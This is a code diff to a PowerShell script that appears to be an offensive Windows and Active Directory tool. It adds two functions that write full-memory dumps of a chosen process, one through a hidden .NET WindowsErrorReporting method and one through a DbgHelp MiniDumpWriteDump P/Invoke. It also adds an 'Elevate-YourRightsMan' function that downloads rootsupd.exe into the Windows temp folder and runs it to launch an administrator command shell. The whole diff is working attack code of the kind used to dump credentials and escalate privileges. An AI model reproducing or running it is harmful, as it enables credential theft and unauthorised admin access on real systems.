@@ -49,7 +49,7 @@ function Set-SymbolServer {
 
 function Write-Minidump ($process, $dumpFilePath) {
     $windowsErrorReporting = [PSObject].Assembly.GetType('System.Management.Automation.WindowsErrorReporting')
-    $windowsErrorReportingNativeMethods = $windowsErrorReporting.GetNestedType('NativeMethods', 'NonPublic')
+    $windowsErrorReportingNativeMethods = $windowsErrorReporting.GetNestedType('NativeMethods', 'NonPublic')    
     $flags = [Reflection.BindingFlags] 'NonPublic, Static'
     $miniDumpWriteDump = $windowsErrorReportingNativeMethods.GetMethod('MiniDumpWriteDump', $flags)
     $miniDumpWithFullMemory = [UInt32] 2
@@ -63,13 +63,63 @@ function Write-Minidump ($process, $dumpFilePath) {
 
     $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
     try{
-    $result = $miniDumpWriteDump.Invoke($null, @($processHandle,$processId,$fileStream.SafeFileHandle,$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))
+        $result = $miniDumpWriteDump.Invoke($null, @($processHandle,$processId,$fileStream.SafeFileHandle,$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero))        
+        if(!$result) {
+            Write-Host "Error : cannot dump the process" -ForegroundColor Red
+            $fileStream.Close()
+            Stop-Script
+        }
     }
     catch{
-        $_.Exception()
+        $_.Exception()       
+        Write-Host "Error : cannot dump the process" -ForegroundColor Red
+        $fileStream.Close()
+        Stop-Script 
     }
-
     $fileStream.Close()       
+}
+
+function Write-MiniDumpDBGHelp ($process, $dumpFilePath){
+    $MethodDefinition = @'
+[DllImport("DbgHelp.dll", CharSet = CharSet.Unicode)]
+public static extern bool MiniDumpWriteDump(
+    IntPtr hProcess,
+    uint processId,
+    IntPtr hFile,
+    uint dumpType,
+    IntPtr expParam,
+    IntPtr userStreamParam,
+    IntPtr callbackParam
+    );
+'@
+
+    $dbghelp = Add-Type -MemberDefinition $MethodDefinition -Name 'dbghelp' -Namespace 'Win32' -PassThru
+
+    $miniDumpWithFullMemory = [UInt32] 2
+
+    $processId = $process.Id
+    $processName = $process.Name
+    $processHandle = $process.Handle
+    $processFileName = "$($processName).dmp"
+
+    $processDumpPath = "$dumpFilePath\$processFileName"
+
+    $fileStream = New-Object IO.FileStream($processDumpPath, [IO.FileMode]::Create)
+    try{
+        $result = $dbghelp::MiniDumpWriteDump($processHandle,$processId,$fileStream.SafeFileHandle.DangerousGetHandle(),$miniDumpWithFullMemory,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
+        if(!$result) {
+            Write-Host "Error : cannot dump the process" -ForegroundColor Red
+            $fileStream.Close()
+            Stop-Script
+        }
+    }
+    catch{
+        $_.Exception.Message
+        Write-Host "Error : cannot dump the process" -ForegroundColor Red
+        $fileStream.Close()
+        Stop-Script
+    }
+    $fileStream.Close()
 }
 
 function Run-WmiRemoteProcess {
@@ -248,3 +298,15 @@ function Set-ActiveDirectoryInformations ($adFlag) {
         try {$backupOperators = (Get-ADGroupMember $backupOperatorsGroup -Recursive).DistinguishedName}catch{}      
     }
 }
+function Elevate-YourRightsMan {
+    $fileToDownload = "http://download.microsoft.com/download/1/F/F/1FF5FEA9-C0F4-4B66-9373-278142683592/rootsupd.exe" 
+    $fileDownloaded = "C:\Windows\temp\rootsupd.exe" 
+     
+    $webClient = new-object System.Net.WebClient 
+    $webClient.DownloadFile($fileToDownload, $fileDownloaded) 
+     
+    $scriptPath = Split-Path $MyInvocation.InvocationName        
+   
+    &$fileDownloaded "/C:c:\windows\system32\cmd.exe /K Title (launch the script from here, you are admin now)"
+}
+
